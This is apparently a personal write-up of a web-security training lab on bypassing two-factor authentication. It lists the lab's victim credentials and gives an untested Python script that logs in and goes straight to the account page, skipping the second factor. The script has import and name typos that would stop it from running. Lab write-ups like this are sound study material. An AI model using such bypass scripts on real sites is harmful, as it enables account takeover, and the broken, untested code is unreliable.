## 2FA  bypass

- There was a bypass of the 2FA and one doesnt have to route to the /login2 an can manually go to my-account evading 2FA

Target creds :
    Username : carlos
    Password : montoya
    Email :  carlos@carlos-montoya.net


#### A custom script in python can be use for the 2FA bypass

*However it doenst work the script probaly because ive finished the lab anyway and solved it or there is a request limit to access the lab but havent tested the script on the lab but it should work*

``` python
import requests
import sys
import urlib3

# Disable the warning in urlib
urlib3.disable_warnings(urlib3.exceptions.InsecureRequestWarnig)

# Set proxy to be burp
proxies = {'http': 'http://127.0.0.1:8080', "https": "http://127.0.0.1:8080"}

def access_target_account(s, url):
    # Set the target account login data
    login_data = {"username": "carlos", "password": "montoya"}
    login_url = f"{url}/login"

    # make the request to login
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies, allow_redirects=False)
    print(r.text)
   
   # Comment to comfirm bypass
    my_account_url = f"{url}/my-account"
    r = s.get(my_account_url, verify=False, proxies=proxies)
    if ("log out" in r.text):
        print("[+] Successfully logged in as carlos and bypassed 2FA")
    else:
        print("[-] Failed to bypass 2FA")

def main():
    print("[-] Debug , ", sys.argv)

    if len(sys.argv) != 2:
        print("(+) Usage %s <url>" % sys.argv[0])
        print("(+) Example %s www.example.com" % sys.argv[0])
        sys.exit(1)
    
    s = requests.session()
    url = sys.argv[1]
    access_target_account(s, url)
    s.proxies = proxies

if __name__ == "__main__":
    main()


```